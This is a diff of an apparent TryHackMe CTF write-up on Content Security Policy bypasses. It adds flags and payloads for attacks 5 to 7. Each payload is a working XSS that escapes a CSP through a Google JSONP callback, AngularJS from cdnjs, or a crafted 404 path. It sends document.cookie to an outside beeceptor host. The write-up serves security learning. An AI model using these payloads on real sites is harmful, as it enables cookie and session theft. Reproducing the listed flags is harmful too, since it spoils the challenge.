@@ -220,8 +220,7 @@ You can access the introduction at http://xx.xxx.xxx.xxx/. </p>
 
 <br>
 <br>
-
-
+<br>
 <p>7.2. Flag for attack-2<br>
 <code>THM{Us1ng_data:_1snt_Any_S4fer}</code></p>
 
@@ -263,8 +262,7 @@ script src="data:;base64,ZmV0Y2goYGh0dHBzOi8vcmFuZG9tY3NwLmZyZWUuYmVlY2VwdG9yLmN
 
 <br>
 <br>
-
-
+<br>
 <p>7.3. Flag for attack-3<br>
 <code>THM{Th4ts_N0t_4n_1m4ge!!}</code></p>
 
@@ -293,7 +291,7 @@ script src="data:;base64,ZmV0Y2goYGh0dHBzOi8vcmFuZG9tY3NwLmZyZWUuYmVlY2VwdG9yLmN
 
 <br>
 <br>
-
+<br>
 <p>7.4. Flag for attack-4<br>
 <code>THM{Style_Y0ur_W3bs1teS}</code></p>
 
@@ -331,19 +329,121 @@ Content-Security-Policy: default-src 'none'; style-src * 'self'; script-src 'non
 ```
 
 <br>
+<br>
+<br>
 <p>7.5. Flag for attack-5<br>
-<code>____</code></p>
+<code>THM{N0_JSONP_D0mains_Plz}</code></p>
+
+<p><em>CSP Evaluator</em></p>
+<br>
+
+```bash
+Content-Security-Policy: default-src 'none'; style-src 'self'; img-src *; script-src 'unsafe-eval' *.google.com
+```
 
 <br>
 
+<img width="1112" height="425" alt="image" src="https://github.com/user-attachments/assets/50021b52-32c1-4d96-9c27-b0bb0abf20d7" />
+
+
+<br>
+<p><em>payload</em></p>
+
+```bash
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=eval(document.location='https://researcher.free.beeceptor.com/'.concat(document.cookie))"></script>
+```
+
+<br>
+
+<p><em>researcher.beeceptor.com</em></p>
+<br>
+
+<img width="391" height="288" alt="image" src="https://github.com/user-attachments/assets/0c0efa26-46ad-4717-83c9-21284e5117d6" />
+
+<br>
+
+```bash
+GET `/flag=THM%7BN0_JSONP_D0mains_Plz%7D`
+```
+<br>
+<br>
+<br>
 <p>7.6. Flag for attack-6<br>
-<code>____</code></p>
+<code>THM{Trust_N0_CDN}</code></p>
+
+<p><em>CSP Evaluator</em></p>
+<br>
+
+```bash
+Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; script-src 'unsafe-eval' cdnjs.cloudflare.com
+```
 
 <br>
 
-<p>7.7. Flag for attack-7. Hint : The 404 error looks kinda weird...<br>
-<code>____</code></p>
+<img width="1105" height="401" alt="image" src="https://github.com/user-attachments/assets/6cc66344-7318-45c3-8f1b-14828160ee0b" />
 
+<br>
+<p><em>payload</em></p>
+
+```bash
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js" integrity="sha512-C4LuwXQtQOF1iTRy3zwClYLsLgFLlG8nCV5dCxDjPcWsyFelQXzi3efHRjptsOzbHwwnXC3ZU+sWUh1gmxaTBA==" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
+<div ng-app ng-csp>
+{{$on.curry.call().document.location='https://researcher.free.beeceptor.com/' + $on.curry.call().document.cookie}}
+</div>
+```
+
+<br>
+
+<p><em>researcher.beeceptor.com</em></p>
+<br>
+
+<img width="406" height="409" alt="image" src="https://github.com/user-attachments/assets/e4ae928b-dc57-4308-be55-1f0b915aa7e2" />
+
+<br>
+
+```bash
+GET `/flag=THM%7BTrust_N0_CDN%7D`
+```
+
+<br>
+<br>
+<br>
+<p>7.7. Flag for attack-7. Hint : The 404 error looks kinda weird...<br>
+<code>THM{Th1s_4udio_S0unds_N1ce}</code></p>
+<br>
+<p><em>CSP Evaluator</em></p>
+<br>
+
+```bash
+Content-Security-Policy: default-src 'none'; media-src *; style-src 'self'; script-src 'self'
+```
+
+<br>
+
+<img width="1109" height="400" alt="image" src="https://github.com/user-attachments/assets/95bf664c-cc4b-4c27-8112-3a023f281065" />
+
+
+<br>
+<p><em>payload</em></p>
+
+```bash
+<script src="/'; new Audio('https://researcher.free.beeceptor.com/'+document.cookie);'"></script>
+```
+
+<br>
+
+<p><em>researcher.beeceptor.com</em></p>
+<br>
+
+<img width="418" height="252" alt="image" src="https://github.com/user-attachments/assets/67a69c19-5495-48ec-840f-977656012e69" />
+
+
+<br>
+
+```bash
+GET `/flag=THM%7BTh1s_4udio_S0unds_N1ce%7D`
+```
 
 <br>
 <h2>Task 8 . CSP Sandbox :: Defend Challenges</h2>
